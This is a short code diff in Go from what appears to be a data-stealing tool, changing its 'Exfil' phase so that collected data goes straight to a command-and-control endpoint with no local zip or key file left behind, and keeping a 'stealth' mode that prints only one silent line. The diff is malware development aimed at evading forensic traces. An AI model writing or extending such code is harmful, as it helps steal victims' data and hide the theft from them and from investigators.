@@ -178,7 +178,11 @@ func main() {
 		}
 
 		// ---- Phase 4: Exfil ----
-		if localMode {
+		// When --exfil is set, data goes straight to C2 — no local artifacts.
+		// Local .zip + .key are only saved when operating without a C2 endpoint.
+		saveLocal := localMode && exfilURL == ""
+
+		if saveLocal {
 			if err := exfil.SaveLocal(ez, "adn_data.zip"); err != nil {
 				log.Fatalf(ColorRed+"[!] Save failed: %v"+ColorReset, err)
 			}
@@ -186,11 +190,9 @@ func main() {
 			// Save decryption key to timestamped file — never print it to console.
 			keyFile := exfil.KeyFileName()
 			if err := exfil.SaveKey(ez, keyFile); err != nil {
-				// Key file write failed — warn loudly regardless of stealth mode.
 				fmt.Printf(ColorRed+"[!] CRITICAL: Could not save key file: %v"+ColorReset+"\n", err)
 				fmt.Println(ColorRed + "[!] Data is UNRECOVERABLE without the decryption key!" + ColorReset)
 			} else if stealth {
-				// Stealth: one silent line only — no key value ever
 				fmt.Printf("[key]→%s\n", keyFile)
 			} else {
 				printKeyBox(keyFile)
